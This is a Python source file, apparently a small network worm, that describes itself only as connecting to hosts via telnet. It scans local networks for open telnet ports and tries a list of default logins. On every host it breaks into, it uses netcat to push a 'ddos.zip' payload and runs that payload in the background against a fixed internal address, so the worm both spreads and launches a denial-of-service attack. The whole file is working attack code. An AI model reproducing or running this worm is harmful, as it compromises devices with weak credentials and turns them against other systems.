"""
Connect to hosts via telnet
"""

import os
import telnetlib
import search
import socket

from constants import DEFAULT_LOGINS

# Save hosts that already accessed
known_hosts = []


# Check if port from given host is open
def is_open(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = sock.connect_ex((host, port))
    return result == 0


def login(host, username, password):
    try:
        # Start connection
        tn = telnetlib.Telnet(host, timeout=5)
        # 'b' before converts to binary
        tn.read_until(b"login: ", 10)
        tn.write(username.encode('ascii') + b"\n")

        if password:
            tn.read_until(b"Password: ", 5)
            tn.write(password.encode('ascii') + b"\n")
    except:
        # print("Cannot connect to host:", host)
        return

    # Returns telnet connection
    return tn


def replicate(tn):
    try:
        # Open nc connection to receive the file
        tn.write(b"nc -l -p 10000 > ddos.zip\r\n")
        os.system("nc -w 5 {} 10000 < ddos.zip".format(tn.host))
        # Execute script
        tn.write(b"nohup python3 ddos.zip 192.168.10.5 5 &\r\n")
        tn.write(b"exit\r\n")
        tn.close()   
    except EOFError:
        print("Connection to host lost")
    except: 
        print("Replication error")


def network_replicate():
    global known_hosts

    networks, ips = search.get_ip_addresses()
    print("IP addresses recognition")

    # Add own IPs to known hosts
    for ip in ips:
        if ip not in known_hosts:
            known_hosts.append(ip)

    for network in networks:
        print("Searching hosts for network:", network)
        hosts = search.search_hosts(network)

        for host in hosts:
            if not is_open(host, 23):
                print("Port 23 is closed at host:", host)
                continue
            elif host in known_hosts:
                continue
            print("Trying to login in host:", host)
            for user in DEFAULT_LOGINS:
                tn = login(host, user['username'], user['password'])
                if tn:
                    print("Login successful")
                    replicate(tn)
                    print("Replication successful")
                    known_hosts.append(host)